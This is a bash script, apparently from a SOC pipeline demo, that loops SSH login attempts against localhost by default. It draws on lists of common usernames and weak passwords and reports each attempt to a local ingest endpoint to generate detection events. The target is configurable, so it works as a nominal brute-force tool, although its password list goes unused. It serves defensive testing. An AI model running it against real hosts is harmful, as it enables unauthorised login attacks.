#!/bin/bash
# ============================================================
# SSH Brute Force Attack Script
# Performs REAL failed SSH login attempts against localhost
# and feeds the events into the SOC pipeline via /ingest.
#
# Requirements:
#   - SSH (Remote Login) enabled on this Mac
#
# Usage:  ./scripts/ssh-attack.sh
# Stop:   Ctrl+C
# ============================================================

TARGET="${SSH_TARGET:-127.0.0.1}"
PORT="${SSH_PORT:-22}"
INGEST_URL="${INGEST_URL:-http://localhost:3001/ingest}"
ATTEMPT_DELAY="${ATTEMPT_DELAY:-1}"    # seconds between attempts
HOSTNAME=$(hostname)

# Usernames an attacker would try
USERNAMES=("root" "admin" "ubuntu" "deploy" "postgres" "oracle" "test" "guest" "ftpuser" "mysql" "jenkins" "backup" "www-data" "nagios" "tomcat" "pi" "user" "support")

# Passwords
PASSWORDS=("password" "123456" "admin" "root" "pass123" "letmein" "qwerty" "abc123" "password1" "iloveyou")

echo "============================================"
echo "  SSH Brute Force Attack"
echo "============================================"
echo "Target:    $TARGET:$PORT"
echo "Ingest:    $INGEST_URL"
echo "Delay:     ${ATTEMPT_DELAY}s between attempts"
echo ""

# Check if SSH is reachable
if ! nc -z -w2 "$TARGET" "$PORT" 2>/dev/null; then
  echo "ERROR: Cannot connect to $TARGET:$PORT"
  echo ""
  echo "Enable SSH on your Mac:"
  echo "  System Settings > General > Sharing > Remote Login > ON"
  exit 1
fi

# Check if producer is reachable
if ! curl -s "$INGEST_URL/../health" >/dev/null 2>&1; then
  echo "WARNING: Producer not reachable at $INGEST_URL"
  echo "Events will still be attempted but may fail to ingest."
  echo ""
fi

echo "SSH is reachable. Starting brute force attack..."
echo ""

attempt=0

while true; do
  user=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
  pass=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
  attempt=$((attempt + 1))

  echo "[Attempt $attempt] $user:$pass → $TARGET:$PORT"

  # Perform real SSH connection attempt
  ssh -o BatchMode=yes \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    -p "$PORT" \
    "${user}@${TARGET}" \
    "echo pwned" 2>/dev/null

  ssh_result=$?

  if [ $ssh_result -eq 0 ]; then
    severity="critical"
    message="Successful SSH login for user ${user} from ${TARGET} (brute force SUCCESS)"
    log_type="authentication"
    raw_log="Accepted password for ${user} from ${TARGET} port ${PORT} ssh2"
    echo "[!!!] SUCCESS — logged in as $user!"
  else
    severity="warning"
    message="Failed SSH login for user ${user} from ${TARGET}"
    log_type="authentication"
    raw_log="Failed password for ${user} from ${TARGET} port ${PORT} ssh2"
    echo "[BLOCKED] Auth failed for $user"
  fi

  # Send structured event to the SOC pipeline
  json=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)",
  "host": "${HOSTNAME}",
  "service": "macos-sshd",
  "logType": "${log_type}",
  "severity": "${severity}",
  "sourceIp": "${TARGET}",
  "username": "${user}",
  "message": "${message}",
  "rawLog": "${raw_log}"
}
EOF
)

  response=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$INGEST_URL" \
    -H "Content-Type: application/json" \
    -d "$json" 2>/dev/null)

  if [ "$response" = "200" ]; then
    echo "[SENT] Event ingested into pipeline"
  else
    echo "[FAIL] Could not reach producer (HTTP $response)"
  fi

  echo ""
  sleep "$ATTEMPT_DELAY"
done
